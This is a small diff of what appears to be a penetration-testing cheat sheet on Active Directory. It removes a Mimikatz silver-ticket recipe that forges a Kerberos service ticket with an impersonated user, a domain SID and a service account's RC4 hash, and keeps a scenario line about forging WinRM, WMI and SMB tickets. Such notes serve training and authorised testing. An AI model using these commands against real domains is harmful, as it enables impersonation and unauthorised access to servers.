@@ -261,12 +261,6 @@ sudo ntpdate -s domain
 
 >Scenario: If ever gain the hash of computer account (DC01$), forge winrm, wmi, smb TGS
 ```
-whoami /user
-kerberos::purge
-kerberos::golden /user:jeffadmin(impersonated user) /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part from whoami /user) /target:CorpWebServer.corp.com /service:HTTP(CIFS|MSSQL|LDAP) /rc4:E2B475C11DA2A0748290D87AA966C327(password hash of iis_service) /ptt
-kerberos::list
-```
-```
 Get Domain's sid:
 Get-LocalUser -Name 'svc_mssql' | select name,sid(result without the last 3digits)
 
